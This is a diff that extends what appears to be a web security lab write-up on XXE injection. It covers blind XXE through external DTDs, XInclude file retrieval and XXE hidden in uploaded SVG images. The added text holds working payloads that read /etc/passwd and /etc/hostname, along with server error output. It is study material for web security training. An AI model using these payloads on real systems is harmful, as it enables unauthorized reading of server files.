@@ -124,3 +124,54 @@ Now we can use exploit server to store partial dtd definitiona file at `/exploit
 Now injecting below payload to the `POST /product/stock` will cause entity declaration and invocation, which will cause to fetch and interpret inline the partial `exploit.dtd` definition.
 
 `exploit.dtd` defines a `file` parameter entity with value of `/etc/passwd` file content, and then evaluates dynamically `error` entity which tries to open the not existantant filename containing `/etc/passwd` value, which triggers an error and responds with it to the client.
+
+XML parameter entity within the definition of another parameter entity is permitted in external DTDs but not in internal DTDs. (Some parsers might tolerate it, but many do not.)
+
+## Exploiting XInclude to retrieve files
+
+This time `POST /product/stock` sends the requests parameters in the classic way. 
+
+But then, provided params are injected into into XML format and parsed on the backed. Since we cannot define `DOCTYPE` document ourselves, we can make use of `XInclude`.
+
+By sending the below value as `productId`, will cause to fetch and parse as text `/etc/passwd` file and then return the value of the file in the error message.
+
+```
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+## Exploiting XXE via image file upload
+
+Creating a comment functionality allows uploading avatar image. Uploaded SVG images seems to be processed and saved as png file then.
+
+Since SVG files are allowed and they have XML format, we can try to inject XXE payloads and hope for the server interpreting it.
+
+Uploading `cat.svg` file with content:
+
+```
+<!DOCTYPE foo [<!ENTITY % r SYSTEM "file:///notexistant"> %r;]>
+```
+
+responds with
+
+```
+SVG transcoder exited with an error: null
+Enclosed Exception:
+/notexistant (No such file or directory)
+```
+
+which proves that we have XXE vulnerability.
+
+Trying to inject that content of the file in `desc` description tag or other similar and then checking the generated png file with `exiftool` for file content failed.
+
+Successful attempt was to generate an image depicting content of the file with `text` tag. Uploading svg file with content shown below creates a comment depicting content of `/etc/hostname` file, which can be the accessed from post comments.
+
+```
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE foo [
+<!ENTITY file SYSTEM "file:///etc/hostname">
+]>
+<svg width="5cm" height="4cm" version="1.1"
+     xmlns="http://www.w3.org/2000/svg">
+<text font-size="16" x="0" y="16">&file;</text>
+</svg>
+```
